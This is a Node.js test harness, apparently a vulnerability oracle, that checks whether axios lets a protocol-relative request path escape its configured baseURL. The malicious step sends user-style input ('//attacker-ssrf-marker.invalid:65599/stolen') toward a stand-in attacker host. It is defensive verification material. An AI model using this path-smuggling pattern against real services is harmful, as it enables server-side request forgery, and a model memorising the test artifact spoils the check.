'use strict';

const net = null; // not used, no sockets created directly

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

async function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // We never open a socket ourselves. Instead we point axios's baseURL at a
  // closed local port on the loopback interface (127.0.0.1) so that any
  // real connection attempt axios makes fails fast with ECONNREFUSED,
  // without us creating or holding any listening socket. This lets us
  // observe whether axios's own adapter pipeline (buildFullPath +
  // isAbsoluteURL + the http adapter's URL construction) decided to target
  // the configured host or an attacker-controlled host embedded in a
  // protocol-relative path, purely from the connection error's address/port,
  // or from a thrown "Invalid URL" style error indicating the request was
  // rejected before any network attempt.

  const GOOD_PORT = 65501; // assumed closed on loopback
  const BAD_HOST = 'attacker-ssrf-marker.invalid';
  const BAD_PORT = 65599;

  const baseURL = 'http://127.0.0.1:' + GOOD_PORT;

  // --- Benign operation first: prove the normal request pipeline works ---
  // We expect a connection-refused style error (since nothing listens on
  // GOOD_PORT), but critically the error must reference the *good* host:port,
  // proving axios correctly built and attempted a request against the
  // configured baseURL + relative path, i.e. the real adapter machinery runs.
  let benignInstance = axios.create({ baseURL, timeout: 3000 });

  let benignErr = null;
  try {
    await benignInstance.get('/some/normal/path');
    // If somehow it succeeds (unexpected, nothing should be listening),
    // treat connection as having happened against the right target; still fine.
  } catch (e) {
    benignErr = e;
  }

  function describeError(e) {
    if (!e) return '';
    const parts = [];
    if (e.message) parts.push(e.message);
    if (e.code) parts.push('code=' + e.code);
    if (e.address) parts.push('address=' + e.address);
    if (e.port) parts.push('port=' + e.port);
    if (e.config && e.config.url) parts.push('config.url=' + e.config.url);
    return parts.join(' | ');
  }

  const benignDesc = describeError(benignErr);

  // Validate the benign call actually attempted to reach the configured
  // host/port (connection refused / timeout / similar network-level error),
  // rather than failing for some unrelated setup reason (e.g. DNS failure,
  // module error, invalid URL construction on a perfectly normal path).
  const benignLooksLikeRealAttempt =
    !!benignErr &&
    (
      (benignErr.code === 'ECONNREFUSED') ||
      (benignErr.code === 'ETIMEDOUT') ||
      (benignErr.code === 'ECONNRESET') ||
      (benignErr.address === '127.0.0.1') ||
      (typeof benignErr.message === 'string' && benignErr.message.indexOf(String(GOOD_PORT)) !== -1)
    );

  if (!benignLooksLikeRealAttempt) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign operation did not behave as a normal network attempt against configured host: ' + benignDesc
    });
    return;
  }

  const operation_completed = true;

  // --- Malicious operation ---
  // Simulate the advisory's scenario: caller builds a path from
  // user-controlled input that happens to start with "//", producing a
  // protocol-relative URL segment pointing at an attacker-controlled host.
  const maliciousInstance = axios.create({ baseURL, timeout: 3000 });

  const userId = '/' + BAD_HOST + ':' + BAD_PORT + '/stolen';
  const requestPath = '/' + userId; // => '//attacker-ssrf-marker.invalid:65599/stolen'

  let maliciousErr = null;
  let maliciousResolved = false;
  try {
    await maliciousInstance.get(requestPath);
    maliciousResolved = true;
  } catch (e) {
    maliciousErr = e;
  }

  if (maliciousResolved) {
    // Should not realistically happen (attacker host is a .invalid TLD and
    // should fail DNS resolution if axios actually attempted to contact it,
    // or fail some other way if it stayed scoped to the good host which is
    // also closed). A resolved response without an error here is suspicious
    // but we cannot classify it as exploit success without an address; treat
    // conservatively as blocked-looking but surface evidence.
    emit({
      operation_completed,
      exploit_succeeded: false,
      evidence: 'malicious request unexpectedly resolved without error; unable to confirm attacker-host targeting'
    });
    return;
  }

  const maliciousDesc = describeError(maliciousErr);

  // Determine whether axios's internal pipeline attempted to target the
  // attacker-controlled host (exploit succeeded) versus rejected the
  // malformed/protocol-relative URL before attempting any such connection
  // (exploit blocked), by inspecting the real error surfaced by axios's own
  // adapter and URL construction logic -- not by re-implementing that logic.
  const attemptedAttackerHost =
    !!maliciousErr &&
    (
      (typeof maliciousErr.hostname === 'string' && maliciousErr.hostname.indexOf(BAD_HOST) !== -1) ||
      (typeof maliciousErr.message === 'string' && maliciousErr.message.indexOf(BAD_HOST) !== -1) ||
      (maliciousErr.config && typeof maliciousErr.config.url === 'string' && maliciousErr.config.url.indexOf(BAD_HOST) !== -1 &&
        // only count as an actual attempt if it's a DNS/connection-stage error,
        // not merely echoing the (rejected) url string in a thrown TypeError
        (maliciousErr.code === 'ENOTFOUND' || maliciousErr.code === 'ECONNREFUSED' || maliciousErr.code === 'ETIMEDOUT' || maliciousErr.code === 'EAI_AGAIN'))
    );

  const rejectedAsInvalidBeforeNetwork =
    !!maliciousErr &&
    typeof maliciousErr.message === 'string' &&
    /invalid url/i.test(maliciousErr.message) &&
    !attemptedAttackerHost;

  let exploit_succeeded = false;
  let evidence;

  if (attemptedAttackerHost) {
    exploit_succeeded = true;
    evidence = 'malicious protocol-relative path "' + requestPath + '" caused axios to attempt a network request targeting attacker-controlled host "' + BAD_HOST + '" instead of staying scoped to baseURL "' + baseURL + '": ' + maliciousDesc;
  } else if (rejectedAsInvalidBeforeNetwork) {
    exploit_succeeded = false;
    evidence = 'malicious protocol-relative path was rejected before any network attempt against the attacker host: ' + maliciousDesc;
  } else {
    // Any other outcome: as long as it did not target the attacker host, it's blocked.
    exploit_succeeded = false;
    evidence = 'malicious request did not target attacker-controlled host; observed error: ' + maliciousDesc;
  }

  emit({
    operation_completed,
    exploit_succeeded,
    evidence
  });
}

main().catch((e) => {
  emit({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unhandled exception: ' + (e && e.message)
  });
});
